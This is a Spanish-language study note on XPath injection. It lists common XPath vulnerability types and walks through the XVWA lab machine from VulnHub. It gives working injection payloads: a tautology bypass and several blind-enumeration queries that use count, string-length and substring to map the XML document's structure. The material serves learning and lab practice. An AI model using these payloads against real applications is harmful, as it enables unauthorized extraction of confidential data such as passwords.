___
- tags: #owasp #xpath_injection
___
**XPath** es un lenguaje de consultas utilizado en **XML** que permite buscar y recuperar información específica de **documentos XML**. Sin embargo, al igual que otros lenguajes de programación y consultas, XPath también puede tener **vulnerabilidades** que los atacantes pueden aprovechar para comprometer la seguridad de una aplicación web.

Las **vulnerabilidades XPath** son aquellas que se aprovechan de las debilidades en la implementación de consultas XPath en una aplicación web. A continuación, se describen algunos tipos de vulnerabilidades comunes en XPath:

- **Inyección XPath**: los atacantes pueden utilizar inyección de código malicioso en las consultas XPath para alterar el comportamiento esperado de la aplicación. Por ejemplo, pueden agregar una consulta maliciosa que recupere toda la información del usuario, incluso información confidencial como contraseñas.
- **Fuerza bruta de XPath**: los atacantes pueden utilizar técnicas de fuerza bruta para adivinar las rutas de XPath y recuperar información confidencial. Esta técnica se basa en intentar diferentes rutas XPath hasta encontrar una que devuelva información confidencial.
- **Recuperación de información del servidor**: los atacantes pueden utilizar consultas XPath maliciosas para obtener información sobre el servidor, como el tipo de base de datos, la versión de la aplicación, etc. Esta información puede ayudar a los atacantes a planear ataques más sofisticados.
- **Manipulación de respuestas XPath**: los atacantes pueden manipular las respuestas XPath de la aplicación web para obtener información adicional o alterar el comportamiento de la aplicación. Por ejemplo, pueden modificar una respuesta XPath para crear una cuenta de usuario sin permiso.

## Ejemplo con la máquina
### Identificación de injección
```txt
search=1' or '1'='1&submit=sql
```
### Identificando etiquetas principales 
```txt
search=1' and count(/*)='2&submit=sql
```
### Identificando la cantidad de caracteres de la etiqueta
```txt
search=1' and string-length(name(/*[1]))>'2&submit=sql
```

### Identificando la cantidad de etiquetas internas
```txt
search=1' and count(/*[1]/*)>='10&submit=sql
```
### Identificando los nombres de las las etiquetas internas
```txt
search=1' and substring(name(/*[1]/*[1]),1,1)='C&submit=sql
```
___
## Referencia
- [Máquina de vulhub - xvwa](https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/)